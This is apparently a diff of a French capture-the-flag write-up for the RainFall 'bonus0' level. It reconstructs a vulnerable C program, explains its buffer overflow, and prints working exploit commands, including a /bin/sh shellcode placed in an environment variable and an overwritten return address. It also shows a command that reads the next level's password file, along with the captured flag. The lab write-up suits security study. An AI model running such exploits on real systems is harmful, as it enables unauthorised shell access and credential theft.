@@ -10,42 +10,72 @@ e
 a e
 """
 
-___ stack main
-0xbffff6c8
+Reconstitution du code source
 
+"""
+void p(char *arg1, char *arg2)
+{
+	char str[4120];
 
-0xbffff688 (ebp + 0x8)
-___
+	puts(arg1);
+	read(0, str, 4096);
+	strchr(str, '\n') = '\0';
+	strncpy(arg2, str, 20);
+}
+"""
 
-ebp  0xbffff680
+La fonction 'p' lis 4096 caracteres au maximum sur l'entree standard, mais n'en n'ecris que 20 sur la variable passe en argument
+Avant d'ecrire il ecrase le premier '\n' qu'il trouve par un '\0', s'il est place apres 20 caractere la variable ne possedera pas de '\0'
 
-___ stack pp
-0xbffff678
-|
-20 a3
-|
-ebp - 0x1c 0xbffff664
-|
-20 a2
-|
-ebp - 0x30 0xbffff650
-|
-40
-|
-0xbffff628
-___
-	a3			a2
-|	20		|	20		|
-zzzzzzzzzzzzzbbbbbbbbbbbb
+"""
+void pp(char *a1)
+{
+	smthg[40];
+	char a2[20];
+	char a3[20];
 
-|	40					|
-aaaaaaaaaaaabbbbbbbbbbbbb          ' 'bbbbbbbbbb
+	p(" - ", a3);
+	p(" - ", a2);
+	strcpy(a1, a3);
+	a1[strlen(a1)] = ' ';
+	strcat(a1, a2);
+}
+"""
 
-reip 0xbffff6d3
+La fonction p est appele 2 fois dans cette fonction 'pp' afin de remplir les variable de sa stack 'a2' et 'a3'
 
-env -i && export SHELLCODE=$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') && python -c 'print "Z"*25 + "\n" + "A"*4070 + "012345678" + "\xd3\xf6\xff\xbf" + "NOPQRSTUVWX"' | ./bonus0
+le strcpy qui suit copie 'a3' qui est la premiere variable dans la stack qui si ne possede pas de '\0' va copier egalement 'a2' le tout dans l'argument 'a1'
 
-r $(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') < <(python -c 'print "Z"*25 + "\n" + "A"*4070 + "012345678" + "\xc5\xf8\xff\xbf" + "NOPQRSTUVWX"')
+Si 'a2' ne possede pas de '\0' le strcpy va continuer a copier jusqu'a en trouver un.
 
-||||||||||||||||
-python -c 'print "Z"*25 + "\n" + "A"*4070 + "012345678" + "\xab\xf8\xff\xbf" + "NOPQRSTUVWX"' > /tmp/s && cat /tmp/s - | `pwd`/bonus0 $(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+'a1' possedant 42 octets n'est pas encore overflow sachant qu'un '\0' est rapidement trouver dans la stack apres 'a2'
+
+L'instruction qui suit ecrase le '\0' par un ' ', la chaine de caracteres est alors allonge d'un seul ' ' car il y avait plusieurs '\0' a cet endroit
+
+le strcat va ecrire a2 a la suite de a1 (a partir du dernier '\0')
+
+"""
+int main(void)
+{
+	smthg[22];
+	char a1[42];
+
+	pp(a1);
+	puts(a1);
+	return (0);
+}
+"""
+
+cela nous permet d'atteindre le retour eip du main.
+
+Il nous faut maintenant un shellcode, pour ca on peut utiliser les arguments du programme ou l'environnement
+
+J'ai utilise l'environnement car elle est situe plus tot dans la memoire donc moins volatile
+
+En utilisant gdb j'obtenais l'adresse 0xbffff8ab, mais pour des raisons que j'ignore probablement lie a l'utilisation de gdb l'adresse est decale lorsque j'essaie le programme dans le shell directement. J'ai retrouve l'adresse en essayant celle a cote de 0xbffff8ab jusqu'a tomber sur la bonne
+
+bonus0@RainFall:~$ export SHELLCODE=`python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
+bonus0@RainFall:~$ `pwd`/bonus0 < <(python -c 'print "Z"*25'; python -c 'print "012345678" + "\xbf\xff\xf8\xb7"[::-1] + "NOPQRST"'; echo 'cat /home/user/bonus1/.pass') -
+ -
+ZZZZZZZZZZZZZZZZZZZZ012345678����NOPQRST�� 012345678����NOPQRST��
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
